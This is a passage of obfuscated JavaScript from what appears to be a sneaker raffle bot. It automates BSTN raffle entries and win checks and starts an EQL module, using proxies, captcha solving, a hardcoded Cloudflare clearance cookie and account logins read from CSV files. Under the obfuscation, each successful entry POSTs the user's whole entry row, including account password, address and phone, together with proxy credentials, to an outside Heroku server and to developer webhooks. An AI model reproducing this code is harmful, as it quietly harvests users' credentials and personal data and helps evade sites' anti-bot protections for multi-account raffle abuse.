                                _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x1a0cb6['errorDEVMSG']), await _0x5cd94d(_0xfda3c6, _0x1a0cb6['errorDEVMSG']);
                            } finally {
                                if (_0x4f11a8)
                                    _0x4f11a8['close']();
                                if (_0x189f45 == 'yes' && _0x30d4f5 != 0x5)
                                    return console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5ac994['name'] + ']\x20Task\x20' + (_0x5abfaf + 0x1) + '\x20:\x20Retrying\x20(' + _0x30d4f5 + '\x20/\x205)')), _0x1cb0ec--, _0x30d4f5 = _0x30d4f5 + 0x1, _0x133668(_0x5ac994, _0x21fc8e, _0x45eec4, _0x5abfaf, _0x30d4f5);
                                _0x189f45 == 'yes' && _0x30d4f5 >= 0x5 && (_0x189f45 = 'no', _0x30d4f5 = 0x0), _0x1cb0ec--, console['log'](_0x4ea3c7() + '\x20[' + _0x5ac994['name'] + ']\x20Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                            }
                        }
                        if (_0x317131 == _0xeab290['length'] - 0x1) {
                            await _0x133668(_0x2411f9, _0xeab290, _0x19c57a, _0x317131, 0x0);
                            return;
                        }
                        _0x133668(_0x2411f9, _0xeab290, _0x19c57a, _0x317131, 0x0), await _0x73bf2c(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x3c76cc, _0x361822, _0x400d5e) {
                    var _0x37427b = 0x0, _0x11774c = _0x361822;
                    for (var _0x2b186d = 0x0; _0x2b186d < _0x361822['length']; _0x2b186d++) {
                        maxTasks = Number(_0x1d78d4['threads']);
                        while (_0x37427b >= maxTasks) {
                            await _0x73bf2c(_0x1d78d4['delay']);
                        }
                        let _0x416e54 = ![];
                        async function _0x5d02c5(_0x30fe40, _0x4bf5db, _0x3b65f7, _0x22de65, _0x2a7748) {
                            _0x37427b++, _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x1d78d4['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x512b93, _0x5989cd = _0x4bf5db[_0x22de65];
                            try {
                                await _0x4b6344(_0x4bf5db, _0x22de65);
                            } catch {
                                _0x259c83 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x4a5840(_0x4adb3e) {
                                const _0x23c7d5 = _0x57b36f['readFileSync']('../successful-tasks.csv', 'utf8'), _0x5edb98 = _0x296e07['parse'](_0x23c7d5, { 'header': !![] })['data'];
                                let _0x393e10 = ![];
                                for (var _0x3b3c07 of _0x5edb98) {
                                    if (_0x3b3c07['Url'] == _0x4adb3e['Url'] && _0x3b3c07['Email'] == _0x4adb3e['Email']) {
                                        _0x393e10 = !![];
                                        break;
                                    }
                                }
                                return _0x393e10;
                            }
                            _0x3ec78c(_0x30fe40['name'] + '\x20Task\x20' + (_0x22de65 + 0x1) + '\x20/\x20' + _0x4bf5db['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                            var _0x4b9796 = Math['round'](Math['random']() * (_0x3b65f7['length'] - 0x1)), _0x234156 = _0x3b65f7[_0x4b9796]['split'](':'), _0xb21772;
                            let _0x2ea0bc = ![], _0x259c83 = 'no';
                            try {
                                if (await _0x4a5840(_0x4bf5db[_0x22de65]) == !![]) {
                                    console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x2ea0bc = !![], _0x416e54 = !![];
                                    return;
                                }
                                try {
                                    _0xb21772 = await _0x1f8a8f['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x234156[0x0] + ':' + _0x234156[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0xb21772 = await _0x1f8a8f['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x234156[0x0] + ':' + _0x234156[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x140dd9 = await _0xb21772['newPage'](), _0x100581 = await _0x140dd9['target']()['createCDPSession'](), { windowId: _0x4ec0c5 } = await _0x100581['send']('Browser.getWindowForTarget');
                                await _0x140dd9['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x433544 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x140dd9['authenticate']({
                                    'username': '' + _0x234156[0x2],
                                    'password': '' + _0x234156[0x3]
                                }), console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x140dd9['goto']('' + _0x4bf5db[_0x22de65]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x73bf2c(0x1388);
                                var _0x55420b = await _0x140dd9['$']('#turnstile-wrapper');
                                if (_0x55420b) {
                                    console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x73bf2c(0x2710);
                                    const _0x18bfc6 = await _0x140dd9['$']('#turnstile-wrapper');
                                    if (_0x18bfc6)
                                        try {
                                            await _0x18bfc6['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x140dd9['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x54714a = await _0x140dd9['$']('#turnstile-wrapper');
                                        if (_0x54714a)
                                            try {
                                                await _0x54714a['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x140dd9['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x100581['send']('Browser.setWindowBounds', {
                                    'windowId': _0x4ec0c5,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x73bf2c(0x1388), await _0x140dd9['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x140dd9['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x73bf2c(0x1f4), console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Logging\x20in'), await _0x140dd9['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x355aa8 => _0x355aa8['click']()), await _0x140dd9['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x140dd9['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x73bf2c(0x7d0), await _0x140dd9['waitForSelector']('#email-login'), await _0x140dd9['type']('#email-login', '' + _0x4bf5db[_0x22de65]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x73bf2c(0xdac), await _0x140dd9['waitForSelector']('#password'), await _0x140dd9['type']('#password', '' + _0x4bf5db[_0x22de65]['Password'], { 'delay': 0xe6 }), await _0x73bf2c(0x157c);
                                try {
                                    await _0x140dd9['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x35897d => _0x35897d['click']());
                                } catch {
                                }
                                try {
                                    await _0x140dd9['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x39a787) {
                                }
                                await _0x73bf2c(0x3e8);
                                const _0x33f5bf = await _0x140dd9['$']('.enteredDraw_container__2KmQ_');
                                if (_0x33f5bf) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4bf5db[_0x22de65]['Size']);
                                try {
                                    if (_0x4bf5db[_0x22de65]['Size'] != 'RANDOM') {
                                        var _0x5d9aee = _0x4bf5db[_0x22de65]['Size']['replace']('.', ',');
                                        const _0x5ef17d = await _0x140dd9['$x']('//div[contains(text(),\x20\x27' + _0x5d9aee + '\x27)]');
                                        await _0x5ef17d[0x0]['click']();
                                    } else {
                                        const _0x6b4d4d = await _0x140dd9['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x773b7d = Math['round'](Math['random']() * (_0x6b4d4d['length'] - 0x1));
                                        await _0x6b4d4d[_0x773b7d]['click']();
                                    }
                                } catch (_0x10ae78) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x73bf2c(0x1f4);
                                const _0x43499c = await _0x140dd9['$']('.addressList_addressItem__LE2PB');
                                if (_0x43499c && _0x4bf5db[_0x22de65]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x140dd9['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x73bf2c(0x5dc), await _0x140dd9['waitForSelector']('#firstname'), await _0x140dd9['type']('#firstname', '' + _0x4bf5db[_0x22de65]['FirstName']), await _0x73bf2c(0x1f4), await _0x140dd9['waitForSelector']('#firstname'), await _0x140dd9['type']('#lastname', '' + _0x4bf5db[_0x22de65]['LastName']), await _0x73bf2c(0x1f4), await _0x140dd9['waitForSelector']('#firstname'), await _0x140dd9['type']('#street', '' + _0x4bf5db[_0x22de65]['Address1']), await _0x73bf2c(0x1f4), await _0x140dd9['waitForSelector']('#firstname'), await _0x140dd9['type']('#houseNumber', _0x4bf5db[_0x22de65]['HouseNumber'] + '\x20' + _0x4bf5db[_0x22de65]['Address2']), await _0x73bf2c(0x1f4), await _0x140dd9['waitForSelector']('#firstname'), await _0x140dd9['select']('#country_code', '' + _0x4bf5db[_0x22de65]['Country']), await _0x73bf2c(0x1f4), await _0x140dd9['type']('#postcode', '' + _0x4bf5db[_0x22de65]['Zip']), await _0x73bf2c(0x1f4), await _0x140dd9['type']('#city', '' + _0x4bf5db[_0x22de65]['City']), await _0x73bf2c(0x1f4), await _0x140dd9['type']('#telephone', '' + _0x4bf5db[_0x22de65]['Phone']), await _0x73bf2c(0x1f4), await _0x140dd9['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x73bf2c(0x9c4);
                                try {
                                    await _0x140dd9['type']('#instagram_name', '' + _0x4bf5db[_0x22de65]['Follower']), await _0x140dd9['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x73bf2c(0x5dc);
                                try {
                                    await _0x140dd9['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x73bf2c(0x5dc), await _0x140dd9['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x247f38 => _0x247f38['click']()), await _0x73bf2c(0x1388);
                                try {
                                    await _0x140dd9['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x140dd9['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x4bf5db[_0x22de65]['Size'] != 'RANDOM') {
                                        var _0x5d9aee = _0x4bf5db[_0x22de65]['Size']['replace']('.', ',');
                                        const _0x3d07f3 = await _0x140dd9['$x']('//div[contains(text(),\x20' + _0x5d9aee + ')]');
                                        await _0x3d07f3[0x0]['click']();
                                    } else {
                                        const _0x5db6f8 = await _0x140dd9['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x773b7d = Math['round'](Math['random']() * (_0x5db6f8['length'] - 0x1));
                                        await _0x5db6f8[_0x773b7d]['click']();
                                    }
                                    await _0x73bf2c(0x5dc);
                                    try {
                                        await _0x140dd9['hover']('#instagram_name'), await _0x140dd9['type']('#instagram_name', '' + _0x4bf5db[_0x22de65]['Follower']), await _0x140dd9['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2a7748 + '\x20/\x205)');
                                    try {
                                        await _0x140dd9['hover']('.checkBox_boxHolder__wLGVe'), await _0x73bf2c(0x5dc), await _0x140dd9['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x73bf2c(0x157c), await _0x140dd9['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x2fe03d => _0x2fe03d['click']()), await _0x73bf2c(0x1388), await _0x140dd9['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x259c83 = 'no', _0x5584d0(_0x4bf5db[_0x22de65], _0x30fe40);
                                try {
                                    prxdata = {
                                        'username': _0x5c7ae6['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x1424cd),
                                        'proxy': '' + _0x3b65f7[_0x22de65]
                                    };
                                    var _0x50043a = JSON['stringify'](prxdata);
                                    let _0x1a77f7 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x50043a, _0x1a77f7);
                                } catch (_0x1b0864) {
                                }
                                console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x375c86 = await _0x1bd114(_0x4bf5db[_0x22de65], _0x30fe40, 'dev', ![]), _0x2457d4 = await _0x1bd114(_0x4bf5db[_0x22de65], _0x30fe40, 'pub', ![]);
                                const _0x50c5f2 = {
                                    'succesDEVMSG': { 'embeds': [_0x375c86] },
                                    'succesPUBMSG': { 'embeds': [_0x2457d4] }
                                };
                                let _0x1424cd = _0x4bf5db[_0x22de65];
                                try {
                                    prxdata = {
                                        'username': _0x5c7ae6['replace']('#', ''),
                                        'module': _0x30fe40['name'],
                                        'entrydata': JSON['stringify'](_0x1424cd),
                                        'proxy': '' + _0x3b65f7[_0x22de65]
                                    };
                                    var _0x50043a = JSON['stringify'](prxdata);
                                    let _0x44e14f = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x50043a, _0x44e14f);
                                } catch (_0x4891b3) {
                                }
                                try {
                                    _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x50c5f2['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x50c5f2['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x323e07, _0x50c5f2['succesPUBMSG']);
                                } catch (_0x1963d5) {
                                    console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1963d5));
                                }
                            } catch (_0x443c57) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20' + _0x443c57)), _0x259c83 = 'yes', _0x512b93 = '' + _0x443c57;
                                var _0x9d9c39 = await _0x1bd114(_0x4bf5db[_0x22de65], _0x30fe40, 'dev', !![], _0x512b93), _0x375c86 = await _0x1bd114(_0x4bf5db[_0x22de65], _0x30fe40, 'dev', ![]), _0x2457d4 = await _0x1bd114(_0x4bf5db[_0x22de65], _0x30fe40, 'pub', ![]);
                                const _0x34e092 = {
                                    'succesDEVMSG': { 'embeds': [_0x375c86] },
                                    'succesPUBMSG': { 'embeds': [_0x2457d4] }
                                };
                                _0x34e092['errorDEV'] = { 'embeds': [_0x9d9c39] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x34e092['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x34e092['errorDEV']);
                            } finally {
                                _0xb21772 && _0xb21772['close']();
                                if (_0x259c83 == 'yes' && _0x2a7748 != 0x5)
                                    return console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Task\x20' + (_0x22de65 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2a7748 + '\x20/\x205)')), _0x2a7748 = _0x2a7748 + 0x1, _0x37427b--, _0x5d02c5(_0x30fe40, _0x4bf5db, _0x3b65f7, _0x22de65, _0x2a7748);
                                _0x259c83 == 'yes' && _0x2a7748 >= 0x5 && _0x3fe3d2(_0x4bf5db[_0x22de65], _0x30fe40), !_0x2ea0bc && (console['log'](_0x4ea3c7() + '\x20[' + _0x30fe40['name'] + ']\x20Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay'])), _0x37427b--;
                            }
                        }
                        _0x5d02c5(_0x3c76cc, _0x11774c, _0x400d5e, _0x2b186d, 0x0), await _0x73bf2c(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5675d7, _0xe65b63) {
                    var _0x410ebc = 0x0, _0x261e2a;
                    try {
                        const _0x28d587 = _0x57b36f['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x261e2a = _0x296e07['parse'](_0x28d587, { 'header': !![] })['data'];
                    } catch (_0x470612) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x1becc7 = 0x0; _0x1becc7 < _0x261e2a['length']; _0x1becc7++) {
                        maxTasks = Number(_0x1d78d4['threads']);
                        while (_0x410ebc >= maxTasks) {
                            await _0x73bf2c(_0x1d78d4['delay']);
                        }
                        async function _0x38d4a0(_0x36ecbc, _0x3be87c, _0x2476e4, _0x5ce94b, _0x21957d) {
                            _0x410ebc++, _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x1d78d4['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0xa9b5c6 != 'yes')
                                var _0xa9b5c6 = '', _0x21957d = 0x0;
                            var _0x3c056f;
                            _0x3ec78c(_0x36ecbc['name'] + '\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20/\x20' + _0x2476e4['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                            var _0x5d7c23 = await _0x1bd114(_0x2476e4[_0x5ce94b], _0x36ecbc, 'acc', ![]);
                            const _0x1ec774 = { 'succesDEVMSG': { 'embeds': [_0x5d7c23] } }, _0x18b3c9 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x276fbf = Math['round'](Math['random']() * (_0x3be87c['length'] - 0x1)), _0x1e58fa = _0x3be87c[_0x276fbf]['split'](':'), _0x1e60cf;
                            try {
                                _0x1e60cf = await _0x1f8a8f['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1e58fa[0x0] + ':' + _0x1e58fa[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x1e60cf = await _0x1f8a8f['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1e58fa[0x0] + ':' + _0x1e58fa[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20:\x20Checking\x20' + _0x2476e4[_0x5ce94b]['Email']);
                                const _0x47888c = await _0x1e60cf['newPage']();
                                await _0x47888c['authenticate']({
                                    'username': '' + _0x1e58fa[0x2],
                                    'password': '' + _0x1e58fa[0x3]
                                }), console['log'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x47888c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x47888c['setRequestInterception'](!![]), _0x47888c['on']('request', _0xb67f18 => {
                                    _0xb67f18['resourceType']() === 'image' ? _0xb67f18['abort']() : _0xb67f18['continue']();
                                });
                                try {
                                    await _0x47888c['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x47888c['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0xa9b5c6 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x47888c['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x73bf2c(0x3e8), await _0x47888c['type']('#email', _0x2476e4[_0x5ce94b]['Email']), await _0x73bf2c(0x1f4), await _0x47888c['type']('#pass', _0x2476e4[_0x5ce94b]['Password']), await _0x73bf2c(0x1f4), await _0x47888c['$eval']('#login-form', _0xcf75e1 => _0xcf75e1['submit']());
                                try {
                                    await _0x47888c['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x73bf2c(0x190);
                                const _0x117e47 = await _0x47888c['evaluate'](() => {
                                    const _0x43897b = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x43897b['map'](_0x347bcc => _0x347bcc['alt']);
                                }), _0x45d21e = await _0x47888c['evaluate'](() => {
                                    const _0x45382e = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x45382e['map'](_0x1b2316 => _0x1b2316['innerHTML']);
                                }), _0x3c2c8f = await _0x47888c['$$']('.raffle-winner');
                                if (_0x3c2c8f['length'] < 0x1) {
                                    console['log'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0xa9b5c6 = 'no';
                                    return;
                                }
                                console['log'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20:\x20' + _0x3c2c8f['length'] + '\x20Wins\x20Found!');
                                for (var _0x3eb406 = 0x0; _0x3eb406 < _0x3c2c8f['length']; _0x3eb406++) {
                                    console['log'](_0x11085b['green'](_0x117e47[_0x3eb406] + _0x45d21e[_0x3eb406]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x161e5c) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20:\x20' + _0x161e5c)), _0x3c056f = '' + _0x161e5c;
                                var _0x48d386 = await _0x1bd114(_0x2476e4[_0x5ce94b], _0x36ecbc, 'acc', !![], _0x3c056f);
                                _0x1ec774['errorDEV'] = { 'embeds': [_0x48d386] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x1ec774['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x1ec774['errorDEV']), _0xa9b5c6 = 'yes';
                            } finally {
                                if (_0x1e60cf)
                                    _0x1e60cf['close']();
                                if (_0xa9b5c6 == 'yes' && _0x21957d != 0x5)
                                    return console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Task\x20' + (_0x5ce94b + 0x1) + '\x20:\x20Retrying\x20(' + _0x21957d + '\x20/\x205)')), _0x410ebc--, _0x21957d = _0x21957d + 0x1, _0x38d4a0(_0x36ecbc, _0x3be87c, _0x2476e4, _0x5ce94b, _0x21957d);
                                _0xa9b5c6 == 'yes' && _0x21957d >= 0x5 && (_0x3fe3d2(_0x2476e4[_0x5ce94b], _0x36ecbc), _0xa9b5c6 = 'no', _0x21957d = 0x0), console['log'](_0x4ea3c7() + '\x20[' + _0x36ecbc['name'] + ']\x20Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']), _0x410ebc--;
                            }
                        }
                        _0x38d4a0(_0x5675d7, _0xe65b63, _0x261e2a, _0x1becc7, 0x0), await _0x73bf2c(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x38fd2f, _0x5f423c, _0x2d5992) {
                _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x1d78d4['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2128e2 = 0x0; _0x2128e2 < _0x5f423c['length']; _0x2128e2++) {
                    var _0x3b7e01;
                    _0x3ec78c(_0x38fd2f['name'] + '\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20/\x20' + _0x5f423c['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                    try {
                        await _0x4b6344(_0x5f423c, _0x2128e2);
                    } catch {
                        _0x47cb76 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x58ddff(_0x390e21) {
                        const _0x28b0e0 = _0x57b36f['readFileSync']('../successful-tasks.csv', 'utf8'), _0x280415 = _0x296e07['parse'](_0x28b0e0, { 'header': !![] })['data'];
                        let _0x259cdf = ![];
                        for (var _0x4e1835 of _0x280415) {
                            if (_0x4e1835['Url'] == _0x390e21['Url'] && _0x4e1835['Email'] == _0x390e21['Email']) {
                                _0x259cdf = !![];
                                break;
                            }
                        }
                        return _0x259cdf;
                    }
                    if (await _0x58ddff(_0x5f423c[_0x2128e2]) == !![]) {
                        console['log'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x1034bb = ![];
                    const _0xa22298 = _0x57b36f['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x1e7dd0 = _0x296e07['parse'](_0xa22298, { 'header': !![] })['data'];
                    for (var _0x42e7a5 of _0x1e7dd0) {
                        _0x42e7a5['Email'] == _0x5f423c[_0x2128e2]['Email'] && (_0x1034bb = !![]);
                    }
                    if (_0x1034bb == ![]) {
                        var _0x43b2be;
                        if (_0x5f423c[_0x2128e2]['Url']['endsWith']('/')) {
                            _0x43b2be = _0x5f423c[_0x2128e2]['Url'] + 'register';
                            if (_0x47cb76 != 'yes')
                                var _0x47cb76 = '', _0x23a490 = 0x0;
                        } else {
                            _0x43b2be = _0x5f423c[_0x2128e2]['Url'] + '/register';
                            if (_0x47cb76 != 'yes')
                                var _0x47cb76 = '', _0x23a490 = 0x0;
                        }
